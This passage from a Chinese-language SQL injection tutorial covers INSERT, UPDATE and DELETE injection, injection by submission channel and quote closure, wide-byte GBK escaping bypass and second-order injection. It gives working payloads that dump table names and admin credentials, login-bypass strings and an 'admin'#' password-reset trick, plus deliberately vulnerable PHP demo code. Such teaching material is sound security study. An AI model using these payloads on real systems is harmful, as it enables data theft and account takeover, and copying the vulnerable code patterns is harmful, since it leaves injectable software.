INSERT INTO 表名(col1,col2,col3) VALUES('a','b','c');   //实战中我们并不知道代码中的SQL是怎么写的，只能靠经验推测尽量还原出原始语句，所以这种注入一般白盒测试挖到比较多。
```
一般程序中的INSERT语句之中VALUES的值都是用单引号来包裹的，int数值型的不需要。所以插入单引号的时候就会影响语句闭合，因此插入失败。
![](http://image.ixysec.com/image/sql/sql110.png)

第二步：在数据提交点，插入双引号,数据正常插入，这时候90%确定是注入点了。
原因：双引号不影响语句的闭合，因此插入成功。
![](http://image.ixysec.com/image/sql/sql111.png)

第三步：在数据提交点，插入`\'`,数据正常插入，这时候100%确认是注入点了。
原因：`\'`是对单引号进行转义，转义后的单引号不会影响语句的闭合，因此插入成功。
![](http://image.ixysec.com/image/sql/sql112.png)

方法2：
方法1比较繁琐，而且对于int型的数据插入点测试可能会失效，int型数据不需要单引号来包裹。

方法2测试语句：
```
sleep(5)
'or sleep(5) or'
```
在int型数据插入点，由于没有单引号包裹，所以可以直接用sleep(5)来判断，如果延时5秒则存在注入；而string型的数据插入点，有单引号包裹，所以我们要先闭合单引号。

![](http://image.ixysec.com/image/sql/sql113.png)

##### 报错法
报错法，顾名思义，就是使用报错注入的方法进行注入的，但是这个方法有个局限性，那就是需要：
```
echo mysql_error(); //打印语句执行出错信息
```
我们先看下正常的INSERT语句：
```
INSERT INTO 表名(col1,col2,col3) VALUES('a','b','c');
```
INSERT语句的可控点在于VALUES中的值，这里我们就需要来闭合引号了，否则我们提交的SQL语句会被当作字符串来处理(原封不动的将语句插入数据库)。

因此，INSERT语句配合报错注入的语句结构为：
```
' or updatexml(0,concat(0x7c,注入语句),1) or '   //不懂函数什么意思的看上面MySQL报错注入
```
接下来看注入的过程：

爆MySQL版本号
```
' or updatexml(0,concat(0x7c,version()),1) or '    //把or换成and也一样，只要保证我们要产生错误的语句被执行就可以
```
![](http://image.ixysec.com/image/sql/sql114.png)

爆数据库用户名
```
' or updatexml(0,concat(0x7c,user()),1) or '
```
![](http://image.ixysec.com/image/sql/sql115.png)

爆表名
```
'or updatexml(0,concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema = database())),1) or '
```
![](http://image.ixysec.com/image/sql/sql116.png)

爆列名
```
'or updatexml(1,concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_name='admin')),0) or'
```
![](http://image.ixysec.com/image/sql/sql117.png)

爆数据
```
'and updatexml(1,concat(0x7c,(select username from admin limit 0,1)),1) and'
```
![](http://image.ixysec.com/image/sql/sql118.png)

##### 闭合语句法
闭合语句法不是上面我们说的闭合引号，而是通过闭合的方法将语句补充完整，使语句可以正常执行。这种方法的优点在于：不需要打印mysql执行的错误语句；其缺点在于：INSERT语句执行后，插入的信息能回显到界面中才行。

我们先看下正常的INSERT语句：
```
INSERT INTO 表名(col1,col2,col3) VALUES('a','b','c');
```
可控点是VALUES中的值，这里我们所说的闭合就是将引号和括号都闭合，使其成为完整的SQL语句，然后将程序本身的语句后段注释掉。

payload:
```
a',user(),'c');-- '
```
说明：–-后面必须有个空格，否则不会当作注释符，也可以用`#`注释。
把payload带入语句中形成的最终语句为：
```
INSERT INTO 表名(col1,col2,col3) VALUES('a',user(),'c');-- '','b','c');   //--后面的都被注释掉了不会执行，VALUES中值的数量要和表名后面字段的数量相同语句才能正常执行。
```

注入过程：
判断列数
```
1',2);-- '
1',2,3);-- '
1',2,3,4);-- '
......
1',2,3,4,5,6,7);-- '
```
说明：最好用数字填充values的值，因为数字可以插入字符型的列，而字符串无法插入数字型的列.
当输入的值的个数和列的个数不匹配的时候，则会插入失败：
![](http://image.ixysec.com/image/sql/sql119.png)

当输入的值的个数和列的个数匹配的时候，则会插入成功。
![](http://image.ixysec.com/image/sql/sql120.png)

从而来判断插入列的个数。

注入数据库用户
```
a',user(),3,4);--     //因为第一列插入的是姓名，字符串类型的，所以需要闭合引号，不然我们的语句都被当做字符串了，闭合后把数据插入到其他列就可以了
```
![](http://image.ixysec.com/image/sql/sql121.png)

插入成功，然后我们看看插入的数据。

![](http://image.ixysec.com/image/sql/sql122.png)

因为我插入到了性别的列中，而我数据库建表时设置的这一列长度为5，所以只显示出5个字符，实战中尽可能选择数据长度比较长的。

注入表名
```
1',2,3,(select group_concat(table_name) from information_schema.tables where table_schema=database()));-- 
```
![](http://image.ixysec.com/image/sql/sql123.png)

然后查看数据:
![](http://image.ixysec.com/image/sql/sql124.png)

注入列
```
1',2,3,(select group_concat(column_name) from information_schema.columns where table_name='admin'));-- 
```
![](http://image.ixysec.com/image/sql/sql125.png)

然后查看数据:
![](http://image.ixysec.com/image/sql/sql126.png)

注入数据：
```
1',2,3,(select username from admin limit 0,1));-- 
```
![](http://image.ixysec.com/image/sql/sql127.png)

然后查看数据:
![](http://image.ixysec.com/image/sql/sql128.png)

常见问题：
第一个：注入数据只能在string型的列位置，因为int型的列无法存放字符串。
第二个：列有长度限制，如果注入出的数据过长，则会显示不全，可以逐段注入数据(limit 0,1 或者 mid(password,1,n))。

还有一种更加复杂的情况：
```
INSERT INTO 表名(col1,col2,col3) VALUES('no','no','ok');   //我们能控制的参数是语句的最后一列。
```
这样我们无法像前面的例子那样，先闭合一个参数并重新构造后面的参数。我们只能想办法将数据插入到这一列当中，还得保证语句正常执行。

MySQL中不能使用加号做字符串拼接，因为在单引号后面也无法使用concat函数拼接。

这里需要利用MySQL的一个特性：
当把一个整数与一个字符值相加时，整数具有操作符优先级并“获胜”，比如下面的例子。
![](http://image.ixysec.com/image/sql/sql129.png)

可以利用这一技巧来提取任意数据，只须将数据转换为整数（除非该数据已经是整数），然后将它“加”到由你控制的字符串的词首部分，

```
a'+ascii(substr((select user()),1,1))+'
a'+ascii(substr((select user()),1,1)))#
```

我们假设只能控制最后一列，拼接后的语句为:
```
INSERT INTO student(name,sex,age,class) VALUES('no','no','no','a'+ascii(substr((select user()),1,1))+'')    //a与我们的user()数据库用户名的第一位的ascii码值相加，最后只会留下ascii码值插入到了数据库中
```
![](http://image.ixysec.com/image/sql/sql130.png)

然后查看数据
![](http://image.ixysec.com/image/sql/sql131.png)

只能一位一位插入，最后还原成字符。

#### UPDATE注入
##### 检测方法
和INSERT注入检测方法相同，请参考上面的检测方法。

##### 报错法
正常SQL语句：
```
UPDATE student SET name='name',sex='sex',age='age',class='class' WHERE id=1
```

UPDATE配合报错注入的语句结构：
```
'or updatexml(1,concat(0x7c,注入语句),2) or'
```

爆数据库用户名
```
'or updatexml(1,concat(0x7c,user()),2) or'
```
![](http://image.ixysec.com/image/sql/sql132.png)

爆表名
```
'or updatexml(0,concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema = database())),1) or '
```
![](http://image.ixysec.com/image/sql/sql133.png)

爆列名
```
'or updatexml(0,concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_name = 'admin')),1) or '
```
![](http://image.ixysec.com/image/sql/sql134.png)

爆数据
```
'or updatexml(0,concat(0x7c,(select concat(username,0x7c,password) from admin limit 0,1)),1) or '
```
![](http://image.ixysec.com/image/sql/sql135.png)

##### 闭合语句法

UPDATE语句闭合难度要比INSERT语句难一点，下面我们先看下UPDATE语句：
```
UPDATE table_name SET name='name',sex='sex',age='age',class='class' WHERE id=1
```
这里我们要用到它的特性构造：
```
-- 方法1：
payload:aaa' where id=1 and (盲注语句)--

UPDATE table_name SET col1='aaa' where id=1 and (盲注语句)--' where id = 1;

-- 方法2：
payload:aaa',col2=user() where id=1--

UPDATE table_name SET col1='aaa',col2=user() where id=1-- ' where id=1;
```
一般白盒测试的时候遇到几率多，因为我们需要知道它的列名。

这里侧重介绍一下第二种方法：

查数据库用户名
```
a',class=user() where id=1-- 
```
![](http://image.ixysec.com/image/sql/sql136.png)

查看信息
![](http://image.ixysec.com/image/sql/sql137.png)

查表名
```
a',class=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where id=1-- 
```
![](http://image.ixysec.com/image/sql/sql138.png)

查看信息
![](http://image.ixysec.com/image/sql/sql139.png)

查列名
```
a',class=(select group_concat(column_name) from information_schema.columns where table_name='admin') where id=1-- 
```
![](http://image.ixysec.com/image/sql/sql140.png)

查看信息
![](http://image.ixysec.com/image/sql/sql141.png)

查数据
```
a',class=(select password from admin) where id=1-- 
```
![](http://image.ixysec.com/image/sql/sql142.png)

查看信息
![](http://image.ixysec.com/image/sql/sql143.png)

#### DELETE注入
DELETE语句：
```
DELETE FROM table_name where id=1
```
DELETE语句给用户控制的点只有id=1这里了，所以注入方法比较简单，只能使用基于时间的盲注或者报错注入来进行了。

判断注入
```
and if(1=1,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql144.png)

注入过程
注入过程只能采用报错注入或者基于时间的盲注，因为当where条件控制语句的集合为空的时候，也显示删除成功(语句执行成功了的)。

配合基于时间的盲注：
```
and if(盲注语句,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql145.png)

结合上面的时间盲注一位一位猜ascii码，最后还原成字符。

配合报错注入：
```
and updatexml(0,concat(0x7c,注入语句),1)
```
![](http://image.ixysec.com/image/sql/sql146.png)

### 根据提交方式分类
根据数据的提交方式进行分类，数据的提交方式包括GET、POST、COOKIE、HTTP头，所以此分类就有4类，GET注入、POST注入、COOKIE注入、HTTP注入。

其中，除GET注入以外，其他三种注入方法常常和盲注、报错注入配合使用。在本章节我们不会详细介绍盲注和报错注入的使用方法和选择方法，案例中我们也只提供一个Payload的框架，具体使用方法请到前面的相关章节学习。

#### GET注入
使用GET型提交方法提交数据的注入点也被称为GET型注入。我们之前提到的SQL注入大多都是GET型注入，它的特点就是将注入语句放入URL中进行注入的。

#### POST注入

顾名思义，使用POST型提交方法提交数据的注入点也被称为POST型注入，常见的POST型注入产生的地方有：登陆、注册等等。之前我们提到的INSERT注入就是以POST的提交方式提交数据的，因此它也属于一个POST型注入。

POST型注入方法和GET型类似，如果有回显的话可以用联合查询法；如果无回显的话可以用盲注和报错注入；如果后台执行的SQL语句不是select，则按照对应的SQL语句注入方法进行注入即可。

第一步：抓取登陆包
![](http://image.ixysec.com/image/sql/sql147.png)

第二步：将注入payload放入用户名参数中(不放入密码参数是因为密码参数在带入数据库查询之前一般都会做一个md5加密)
```
admin' and if(1=1,sleep(5),0) and 'a'='a

/* 一般后台登陆的SQL语句为：

  select * from admin where username='$username' and password='$password';

  因为账号密码均是字符类型，因此需要单引号包裹

  因此我们再构造payload的时候需要闭合单引号

  admin' 闭合前面的单引号

  and 'a'='a 闭合后面的单引号 

  payload带入后则是：

  select * from admin where username='admin' and if(1=1,sleep(5),0) and 'a'='a' and password='password';
*/
```
![](http://image.ixysec.com/image/sql/sql148.png)

可以看到if判断条件成立的话则延时5秒返回结果，否则直接返回。

说明：
1.后面的注入可以参考基于时间的盲注进行下一步的注入
2.这里我们只列举了这一种情况，当然有些情况下报错注入也是可以用的，只不过需要打印mysql_error()
3.除了用Burpsuite抓包测试之外，还可以用hackbar的POST提交方法进行测试
4.万能密码：使语句称为永真式即可`(e.g. admin' # , admin' or '1'='1)`

#### COOKIE注入
COOKIE注入介绍
COOKIE型注入是通过COOKIE进行数据提交的，其常见的情况有验证登陆、$_REQUEST获取参数。

$_REQUEST是一种获取数据的方法，它包含了GET、POST、COOKIE三种提交方式。如下代码：
```
<?php
$id = $_REQUEST['id'];
echo $id;
?>
```
对于这段代码，我们使用GET、POST、COOKIE三种提交方式进行数据提交均可。

COOKIE注入过程
判断注入
![](http://image.ixysec.com/image/sql/sql149.png)

注入过程和其他注入方式相同，只是提交语句的位置放在了cookie，根据实际情况选用联合查询、盲注、报错注入还是其他方式灵活运用。

#### HTTP头注入
HTTP头注入是指从HTTP头中获取数据，而未对获取到的数据进行过滤，从而产生的注入。

HTTP头注入常发生在程序采集用户信息的模块中，比如获取用户的IP：X-Forwarded-For；再比如获取用户的浏览器类型：User-Agent 等等…

从HTTP头中的获取的数据一般不会改变页面的回显，因此，基于时间的盲注常和HTTP头注入配合使用。

原理和其他提交方式一样，从哪里接收数据，就把注入语句写在哪里。

比如获取用户的IP：X-Forwarded-For 进行一些查询,抓包，然后在数据包中加上
```
X-Forwarded-For: 123.123.123.123' and if(1=1,sleep(5),0) and '1'='1
```
配合盲注使用，盲注方法请参看盲注章节。


### 根据闭合方式分类
不同数据类型的数据在SQL语句拼接的时候也会有所不同，比如数字型的不需要单引号包裹，但是字符型的就需要单引号包裹，而搜索型的则是在用户提交的数据前后加上通配符%，因此由此分类，其实是按照闭合方式来进行的分类。

在本章节介绍的注入方式常常和联合查询、报错注入、盲注等配合使用，但我们不会详细介绍这些注入的具体使用方法和选择方法，案例中我们也只提供一个Payload的框架，具体使用方法请到前面的相关章节学习。

#### 数字型注入
由于SQL语句中数字类型的值不需要单引号包裹，所以可以直接在后面添加SQL语句来进行注入，不必考虑单引号情况。

程序中的SQL语句结构：
```
select * from pro where id=$id;  // $id用户可控
```
在MySQL中，数字类型也可以用单引号包裹，并且很多程序员在程序中拼接SQL语句的时候也喜欢用单引号包裹住所有值，所以有时候数字型注入也需要闭合单引号，闭合方法请看继续看字符型注入。

#### 字符型注入
由于SQL语句中字符串通常要使用单引号来包裹，所以在注入的时候要闭合单引号，否则注入语句包裹在单引号中会被当作字符串来进行处理。

程序中的SQL语句结构：
```
select * from admin where username='$user' and password='$pass';
```
闭合方法：
```
aa' and 注入语句 and 'a'='a

-- 和#将语句后面的数据注释掉也可以
aa' 注入语句 -- 
aa' 注入语句 #
```

闭合是为了让注入语句正常执行，只要闭合正确，注入语句根据具体情况选择合适的。

#### 搜索型注入
由于搜索型SQL语句通常使用`%`和`'`包裹，因此在注入的时候需要闭合`%`和`'`，否则就会报错。

搜索型SQL语句结构：
```
select * from pro where content like '%$keyword%';
```
闭合方法：
```
aa%' and 注入语句 and '%aa%' ='%aa
aa%' and 注入语句 and '%' ='
-- 和#将语句后面的数据注释掉也可以
aa%' 注入语句 --
aa%' 注入语句 #
```

搜索型注入也可以配合联合查询法、盲注或者报错注入来进行。

### 宽字节注入
在很多时候，注入并不是那么顺利的，程序员会使用一些转义函数等让我们的语句无法执行。

存在注入的代码
```
<?php
$id = $_GET['id'];

$conn = mysql_connect('127.0.0.1','root','root');
mysql_query("set names 'gbk'");
mysql_select_db('sqlin_wide_bytes',$conn);

$sql = "select * from news where id='{$id}'";//id被包裹在单引号中

$result = mysql_query($sql);
?>
```
上面的代码我们可以闭合前后的单引号进行注入，但如果程序员使用了addslashes，mysql_real_escape_string，mysql_escape_string等这些转义函数，比如下面的代码：
```
<?php
$id = addslashes($_GET['id']);//对接收到的参数id进行转义

$conn = mysql_connect('127.0.0.1','root','root');
mysql_query("set names 'gbk'");
mysql_select_db('sqlin_wide_bytes',$conn);

$sql = "select * from news where id='{$id}'";

$result = mysql_query($sql);
?>
```
像上面的代码我们进行注入会是这样的情况，如图：
![](http://image.ixysec.com/image/sql/sql150.png)

可以看到我们输入的单引号都被转义成了`\'`，这样单引号就办法发挥它的作用，我们的注入语句也无法正常执行。
```
转义函数影响的字符包括：
    ASCII（NULL）字符\x00
    换行字符\n，addslashes不转义
    回车字符\r，addslashes不转义
    反斜杠字符\
    单引号字符'
    双引号字符"
    \x1a，addslashes不转义
```

所以我们需要利用宽字节注入吃掉转义函数添加的`\`让我们的`'`发挥它的作用。

宽字符是指两个字节宽度的编码技术，如UNICODE、GBK、BIG5等。当MYSQL数据库数据在处理和存储过程中，涉及到的字符集相关信息包括：
```
（1）character_set_client:客户端发送过来的SQL语句编码，也就是PHP发送的SQL查询语句编码字符集。

（2）character_set_connection:MySQL服务器接收客户端SQL查询语句后，在实施真正查询之前SQL查询语句编码字符集。

（3）character_set_database:数据库缺省编码字符集。

（4）character_set_filesystem:文件系统编码字符集。

（5）character_set_results:SQL语句执行结果编码字符集。

（6）character_set_server:服务器缺省编码字符集。

（7）character_set_system:系统缺省编码字符集。

（8）character_sets_dir:字符集存放目录，一般不要修改。


宽字节注入原理：

宽字节对转义字符的影响发生在character_set_client=gbk的情况，也就是说，如果客户端发送的数据字符集是gbk，则可能会吃掉转义字符\，从而导致转义消毒失败。

我们这里的宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）。
    
%df等于?   %5C等于\    %23等于#
```
我们输入`%df' or 1=1;%20%23`，如图：
![](http://image.ixysec.com/image/sql/sql151.png)

`%df\'`对应的编码就是`%df%5c'`，即汉字`運'`，这样单引号之前的转义符号`\`就被吃调了，从而转义消毒失败。然后利用`%23`也就是`#`注释掉后面的引号，我们的语句就能够正常执行了。
```
%df%27===(addslashes)===>%df%5c%27===(数据库GBK)===>運'
```
后面就是根据情况正常选择联合查询、报错注入、盲注灵活使用。

### 二次注入
二次注入的过程是先将注入语句插入到数据库，然后在某些情况下代码在执行SQL语句的时候会自动用到数据库中的数据，从而把我们事先插入到数据库中的注入语句带入执行了。

自己简单写了一个小例子，代码很简单，存在很多其他漏洞和注入，这里只是演示二次注入，其他注入请看其他章节：

注册页面
```
<?php
if(isset($_GET['act'])){
    $mysqli = new mysqli("127.0.0.1", "root", "root", "sqlin");
    $mysqli->query("set names 'utf8'");
    $username = addslashes($_POST['username']);//使用了addslashes函数对特殊字符进行转义，所以没办法用单引号闭合注入
    $password = $_POST['password'];
    $sql = "INSERT INTO admin(username,password) VALUES('{$username}','{$password}')";
    if($mysqli->query($sql)){
        echo $sql."<hr>";
        echo "注册成功"."<br>"."<a href='./sqltwo.php'>返回</a>";
    }
}
?>
```
修改密码页面(本人php也很渣，抱歉，我把登陆代码和修改密码写到一个页面了)
```
<?php
$mysqli = new mysqli("127.0.0.1", "root", "root", "sqlin");
$mysqli->query("set names 'utf8'");
$name = "未登录";
if(isset($_COOKIE['username'])){
    $name = $_COOKIE['username'];
}
if(isset($_GET['act'])){
    if($_GET['act'] == 'login' and isset($_POST['username'])){
        
        $user = addslashes($_POST['username']);
        $pass = $_POST['password'];
        $sql = "SELECT * FROM admin WHERE username='{$user}' and password='{$pass}'";
        $result = $mysqli->query($sql);
        $data = $result->fetch_all(MYSQLI_ASSOC);
        // var_dump($data[0]);
        if(count($data) >= 1){
            $username = $data[0]['username'];
            setcookie("username", $username, time()+3600);
            $name = $username;
        }else{
            echo "用户名或密码错误!"."<br>"."<a href='./sqltwo.php'>返回</a>";
        }
    }
    if($_GET['act'] == 'edi'){
        $oldpassword = $_POST['oldpassword'];
        $password = $_POST['password'];
        $sql = "UPDATE admin SET password='{$password}' where username='{$name}' and password='{$oldpassword}'";//重点在这里，修改密码根据username等于$name，$name取的当前登陆的用户名，我们可以在注册时控制这个用户名，注入点就产生在这里
        if($mysqli->query($sql)){
            echo '修改成功';
        }else {
            echo '修改失败: '.$mysqli->error;
            
        }
    }
}

?>
```
二次注入利用过程：
目前数据库中存在的用户如图：
![](http://image.ixysec.com/image/sql/sql152.png)

我们来注册一个用户
![](http://image.ixysec.com/image/sql/sql153.png)

可以看到插入的单引号被转义了，所以在注册时无法进行注入，上面的代码其实可以通过密码框进行注入，实战中密码会有一个加密的过程，然后才带入SQL语句，在这里不做讨论。

此时我们看一下插入到数据库中的数据：
![](http://image.ixysec.com/image/sql/sql154.png)

转义只是为了在执行SQL语句时不会因为特殊字符影响，把特殊字符当成普通字符，可以看到插入到数据库的还是原始的`'`。

下面我们来看看修改密码操作。
![](http://image.ixysec.com/image/sql/sql155.png)

上面的代码可以看到，修改密码修改的是当前登陆的用户的密码，SQL语句的条件是用户名等于当前登陆的用户名，而这里取用户名的时候没有进行转义，从而我们用户名中的单引号就可以发挥作用影响SQL语句的执行。

我们可以简单构造一个payload修改任意用户密码：
```
比如我们想修改用户名为admin的密码，注册用户时用户名可以使用：
admin'#
```
![](http://image.ixysec.com/image/sql/sql156.png)

这样在我们修改密码的时候语句会变成：
```
UPDATE admin SET password='新密码' where username='admin'#' and password='随便'   //这样引号闭合前面的引号，username='admin'，然后#注释掉后面的语句，从而直接将admin的密码修改为我们设置的新密码
```
![](http://image.ixysec.com/image/sql/sql157.png)

![](http://image.ixysec.com/image/sql/sql158.png)

可以看到admin用户的密码已经被修改了。

可以输出错误信息的话还可以结合报错注入：
```
aa'or updatexml(1,concat(0x7c,user()),2) or'   //注册的用户名
```
修改密码
![](http://image.ixysec.com/image/sql/sql159.png)

当然二次注入不止在注册用户时可能会有，只要我们插入数据库的数据在某处SQL语句中被使用就可能产生二次注入，根据程序SQL语句的不同，能做的事也不同，结合实际灵活使用。

